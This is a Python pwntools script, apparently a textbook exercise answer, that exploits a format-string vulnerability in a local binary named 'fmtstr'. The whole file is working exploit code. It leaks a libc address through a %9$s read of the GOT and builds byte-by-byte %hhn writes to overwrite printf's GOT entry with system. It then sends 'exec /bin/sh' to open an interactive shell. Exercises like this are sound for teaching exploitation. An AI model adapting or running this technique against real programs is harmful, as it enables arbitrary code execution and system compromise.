#!/usr/bin/python -i

# answer to Chap3. Q7 (a)

from pwn import *

USE_MY_LIBC = True

if USE_MY_LIBC:
    libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
else:
    libc_path = os.getcwd() + '/libc.so.6'
    env['LD_PRELOAD'] = libc_path

libc = ELF(libc_path)

system_offset = libc.symbols['system']
__libc_start_main_offset = libc.symbols['__libc_start_main']

r = process("./fmtstr")
gdb.attach(r)
raw_input('continue ->')

printf_got = 0x601018
__libc_start_main_got = 0x601020

# leak libc_start_main
# %4444c is to force stdout to flush
p1 = '%9$s@a~%4444c\0'.ljust(24) + p64(__libc_start_main_got)

r.send(p1 + '\n')

libc_addr = int(r.recvuntil('@a~')[:-3][::-1].encode('hex'),
                16) - __libc_start_main_offset

print 'libc addr:', hex(libc_addr)

p = ''


def writeqword(addr, val):
    ret = ''
    str_rep = p64(val)
    last_char = 0
    for cur_char in range(256):
        for j in range(8):
            if (ord(str_rep[j]) == cur_char):
                if not last_char == cur_char:
                    ret += '%1$' + str(cur_char - last_char) + 'c'
                    last_char = cur_char
                ret += '%' + str(6 + 16 + j) + '$hhn'
    ret += ';' * (128 - len(ret))
    for i in range(8):
        ret += p64(addr + i)
    return ret


# write got
p2 = writeqword(printf_got, libc_addr + system_offset)
r.send(p2 + '\nexec /bin/sh\0\n')

r.interactive()
